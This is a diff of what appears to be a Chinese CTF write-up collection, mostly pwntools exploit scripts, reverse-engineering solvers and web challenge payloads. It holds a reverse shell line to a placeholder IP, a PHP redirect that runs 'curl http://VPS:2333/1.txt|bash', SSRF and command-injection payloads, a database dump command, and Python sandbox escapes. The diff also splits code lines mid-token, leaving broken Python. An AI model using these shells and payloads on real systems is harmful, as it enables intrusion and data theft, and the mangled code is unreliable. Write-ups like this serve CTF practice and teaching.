@@ -855,7 +855,7 @@ flag{67e9a228e45b622c2992fb5174a4f5f5}
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 # libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -886,11 +886,6 @@ p.sendlineafter("Input your magic message :",payload)
 sleep(0.2)
 p.send(b"/bin/shx00")
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
@@ -948,11 +943,6 @@ p.sendlineafter("Please input the length of the diary content:",str(0x20)
 
 # gdb.attach(p,"")
 p.interactive()
-```
-
-
-
-```
 typedef enum {
  PROTOBUF_C_TYPE_INT32,      /**< int32 */
  PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
@@ -972,11 +962,6 @@ typedef enum {
  PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
  PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
 } ProtobufCType;
-```
-
-
-
-```
 syntax="proto3";
 
 message devicemsg{
@@ -986,11 +971,6 @@ message devicemsg{
     sint64 whatsize = 4;
     uint32 whatsthis = 5;
 }
-```
-
-
-
-```
 from pwn import*
 import pp_pb2
 
@@ -1109,15 +1089,10 @@ raw_input()
 clean((p64(ret)*2+p64(pop_rdi)+p64(binsh)+p64(libc_1.sym['system'])).ljust(0x58,b"x00"))
 
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1238,17 +1213,7 @@ edit(1,payload)
 
 p.sendlineafter("choice >> ",'5')
 p.interactive()
-```
-
-
-
-```
 v117 = encoding_base32__ptr_Encoding_DecodeString(qword_41A120, v116);
-```
-
-
-
-```
 github_com_golang_protobuf_proto_Unmarshal(
              ptr,
              v117.0.len,
@@ -1260,35 +1225,10 @@ github_com_golang_protobuf_proto_Unmarshal(
              v28,
              v29,
              v82) )
-```
-
-
-
-```
 v118 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Title);
-```
-
-
-
-```
 v119 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Author);
-```
-
-
-
-```
 v120 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Isbn);
-```
-
-
-
-```
 encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->PublishDate);
-```
-
-
-
-```
 cont = bookProto_pb2.CTFBook()
 cont.title = base64.b64encode(title)
 cont.author = base64.b64encode(author)
@@ -1297,11 +1237,6 @@ cont.publish_date = base64.b64encode(date)
 cont.price = 41
 cont.stock = 1
 payload = base64.b32encode(cont.SerializeToString())
-```
-
-
-
-```
 struct book{
  char *title;
  char *Author;
@@ -1310,17 +1245,12 @@ struct book{
  float price;
  long int stcok;
 }
-```
-
-
-
-```
 from pwn import*
 import base64
 import bookProto_pb2
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1442,11 +1372,6 @@ p.sendlineafter("Enter your choice >","6")
 # edit(0,payload)
 
 p.interactive()
-```
-
-
-
-```
 __int64 sub_0()
 {
   __int64 v0; // x8
@@ -1514,11 +1439,6 @@ __int64 sub_0()
     MEMORY[0x298](v1);
   return v4;
 }
-```
-
-
-
-```
 encode = [0xD7, 0x1F, 0x00, 0x00, 0xB7, 0x21, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x27, 0x20, 0x00, 0x00, 0xE7, 0x26, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xF7, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x67, 0x1F, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x47, 0x0F, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x87, 0x27, 0x00, 0x00]
 
 data = []
@@ -1531,11 +1451,6 @@ for i in range(len(data)):
     data[i] -= 0x14
     data[i] //= 0x50
 print("".join(map(chr,data)))
-```
-
-
-
-```
 package com.example.re11113;
 
 import android.os.Bundle;
@@ -1579,11 +1494,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClic
         }
     }
 }
-```
-
-
-
-```
 package com.example.re11113;
 
 import android.util.Base64;
@@ -1614,11 +1524,6 @@ public class inspect {
         }
     }
 }
-```
-
-
-
-```
 import whereThel1b
 
 # flag = input("where is my flag:")
@@ -1633,11 +1538,6 @@ print(f'密文{encry}')
     
 # 输入[108, 117, 72, 80, 64, 49, 100, 73, 82, 116, 120, 92, 94, 90, 113, 22, 64, 89, 56, 38, 81, 2, 64, 75, 127, 68, 115, 24, 125, 92, 106, 103, 95, 122, 94, 93, 113, 70, 46, 84, 92, 66, 82, 33, 104, 111, 84, 84, 80, 102, 102, 17, 73, 121, 125, 26]
 # 密文[108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
-```
-
-
-
-```
 import whereThel1b
 
 def check_flag(flag, encry, position):
@@ -1645,7 +1545,8 @@ def check_flag(flag, encry, position):
     for ch1 in chr_list:
         for ch2 in chr_list:
             for ch3 in chr_list:
-                new_flag = flag[:position] + ch1 + ch2 + ch3 + flag[position + 3:]
+                new_flag = flag[:
+position] + ch1 + ch2 + ch3 + flag[position + 3:]
                 new_flag_encoded = new_flag.encode()
                 
                 whereThel1b.whereistheflag(new_flag_encoded)
@@ -1670,11 +1571,6 @@ decrypted_flag = decrypt_flag()
 print(decrypted_flag)
 
 # flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
   int v3; // eax
@@ -1810,11 +1706,6 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
     return 1LL;
   }
 }
-```
-
-
-
-```
 enc = list('congratulationstoyoucongratulationstoy')
 list_55C3994010A0 = [0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78, 0x00, 0x00]
 
@@ -1859,11 +1750,6 @@ print(v28)
 
 for i in range(38):
     print(chr(v28[i] ^ rand1[i]), end="")
-```
-
-
-
-```
 <?php
 ini_set('open_basedir', '/var/www/html/');
 error_reporting(0);
@@ -1877,33 +1763,13 @@ if(isset($_POST['cmd'])){
 
 show_source(__FILE__);
 ?>
-```
-
-
-
-```
 l%0as
 d%0air
-```
-
-
-
-```
 cmd=php -r system(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,1)));
 
 //解码为：
 echo `mysql -u root -p'root' -e 'select * from PHP_CMS.F1ag_Se3Re7;'`;
-```
-
-
-
-```
 代码审计
-```
-
-
-
-```
 //简单的cms，可以扫扫看？
 //提示1： /flag.php： 
 
@@ -1916,23 +1782,9 @@ if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
 
 //提示2：github找一下源码?
 //需要做一个请求访问本地127.0.0.1
-```
-
-
-
-```
-index.php?s=api&c=api&m=qrcode&text=1&thumb=http://VPS:2234/index1.php&size=10&level=1
-```
-
-
-
-```
+index.php?s=api&c=api&m=qrcode&text=1&thumb=http://VPS:
+2234/index1.php&size=10&level=1
 bash -i >& /dev/tcp/IP/3457 0>&1
-```
-
-
-
-```
 from sanic import Sanic
 from sanic.response import text, html
 from sanic_session import Session
@@ -1980,47 +1832,23 @@ async def admin(request):
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
-```
-
-
-
-```
 Cookie: user="adm 73n"  //ASCII字符绕过
-```
-
-
-
-```
 {"key":"__init__\\.__globals__\\.__file__","value":"/etc/passwd"}
-```
-
-
-
-```
 /home/ctf/.bash_history
 /root/flag
 /flag
 /proc/1/environ
 /proc/fd/self/cmdline
-```
-
-
-
-```
 <?php
 echo "GIF89a"
-$url = "http://127.0.0.1/flag.php?cmd=curl http://VPS:2333/1.txt|bash";
+$url = "http://127.0.0.1/flag.php?cmd=curl http://VPS:
+2333/1.txt|bash";
 
 header('Location: ' . $url, true, 302);
 echo "GIF89a";
 echo "GIF89a";
 exit();
 ?>
-```
-
-
-
-```
 from sys import exit
 from builtins import print
 from dis import dis
@@ -2035,13 +1863,16 @@ import os
 def source_simple_check(source):
     """
     检查源码中是否包含危险字符串，使用纯字符串查找
-    :param source: 源码
-    :return: None
+    :
+param source: 源码
+    :
+return: None
     """
     
     try:
         source.encode("ascii")
-    except UnicodeEncodeError:
+    
+except UnicodeEncodeError:
         print("不允许使用非 ASCII 字符")
         exit()
 
@@ -2053,7 +1884,8 @@ def source_simple_check(source):
 def block_wrapper():
     """
     使用 sys.audithook 检查运行进程，禁止进行危险操作
-    :return: None
+    :
+return: None
     """
     
     def audit(event, args):
@@ -2066,8 +1898,10 @@ def block_wrapper():
 def source_opcode_checker(code):
     """
     检查源码的字节码方面，禁止加载方法和全局变量
-    :param code: 源码
-    :return: None
+    :
+param code: 源码
+    :
+return: None
     """
 
     opcodeIO = StringIO()
@@ -2104,11 +1938,6 @@ if __name__ == "__main__":
         print("bad code-operation why still happened ah?")
     else:
         print(output)
-```
-
-
-
-```
 import os
 import subprocess
 from flask import Flask, request, jsonify
@@ -2147,7 +1976,8 @@ def run():
         return jsonify({
             "result": f"{result}n{error}"
         })
-    except:
+    
+except:
         if os.path.exists(f"/app/uploads/{id}.py"):
             os.remove(f"/app/uploads/{id}.py")
         if os.path.exists(f"/app/uploads/{id}.txt"):
@@ -2158,11 +1988,6 @@ def run():
 
 if __name__ == "__main__":
     app.run("0.0.0.0", 5000)
-```
-
-
-
-```
 def getflag():
     def f():
         yield g.gi_frame.f_back
@@ -2188,11 +2013,6 @@ getflag()
 # 读取到的code值为:
 # ['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
 # 代码不允许Ascci字符
-```
-
-
-
-```
 import numpy as np
 import matplotlib.pyplot as plt
 import os
@@ -2216,11 +2036,6 @@ for i in range(len(trace_array)):
     plt.grid(True)
     plt.savefig(f'./image/{i + 1}.png')
     plt.close()
-```
-
-
-
-```
 from Crypto.Util.number import *
 from secret import flag
 
